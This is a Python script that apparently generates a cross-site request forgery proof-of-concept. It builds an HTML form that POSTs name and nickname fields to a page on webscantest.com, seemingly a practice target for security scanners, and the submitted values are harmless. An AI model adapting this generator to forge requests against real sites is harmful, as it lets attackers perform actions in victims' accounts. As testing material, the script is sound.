#!/usr/bin/env python3
from bs4 import BeautifulSoup, Tag

def generate_poc():
    method="POST"
    encoding_type="application/x-www-form-urlencoded"
    action="http://webscantest.com/crosstraining/aboutyou.php"
    fields = [
        {
            "type":"text",
            "name":"fname",
            "label":"fname",
            "value":"William"
        },
        {
            "type":"text",
            "name":"lname",
            "label":"lname",
            "value":"Mandella"
        },
        {
            "type":"text",
            "name":"nick",
            "label":"nick",
            "value":"Major Mandella"
        }
    ]

    content = BeautifulSoup("<html></html>", "html.parser")
    html_tag = content.find("html")
    form_tag = content.new_tag("form", action=action, method=method, enctype=encoding_type)
    html_tag.append(form_tag)

    for field in fields:
        label_tag = content.new_tag('label')
        label_tag.string = field['label']
        field_tag = content.new_tag("input", type=field['type'], value=field['value'])
        field_tag['name'] = field['name']
        form_tag.append(label_tag)
        form_tag.append(field_tag)

    submit_tag = content.new_tag("input", type="submit", value=action)
    form_tag.append(submit_tag)

    return content.prettify()

if __name__ == "__main__":
    print(generate_poc())